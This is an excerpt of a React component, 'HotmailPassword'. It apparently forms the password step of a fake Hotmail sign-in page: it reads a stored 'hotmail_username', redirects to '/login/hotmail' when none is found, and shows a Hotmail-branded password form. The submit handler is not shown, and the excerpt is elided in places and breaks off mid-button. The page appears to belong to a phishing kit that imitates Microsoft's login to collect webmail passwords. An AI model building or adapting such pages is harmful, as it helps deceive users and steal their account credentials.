...
export default function HotmailPassword() {
  ...
  useEffect(() => {
    const savedEmail = localStorage.getItem("hotmail_username");

    if (!savedEmail) {
      window.location.href = "/login/hotmail";
      return;
    }
    ...
    return (
      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
          <img src={emailLogo} alt="Hotmail" className="mx-auto h-14 w-14 object-contain mb-6" />
          ...
          <form onSubmit={submitForm} className="mt-8 space-y-6">
            ...
            <div className="flex flex-col gap-3 text-sm text-slate-600 sm:flex-row sm:items-center sm:justify-between">
              <button
                ...
                onClick={() => window.location.href = "/login/hotmail"}
              >
                Back
              </button>
              <button
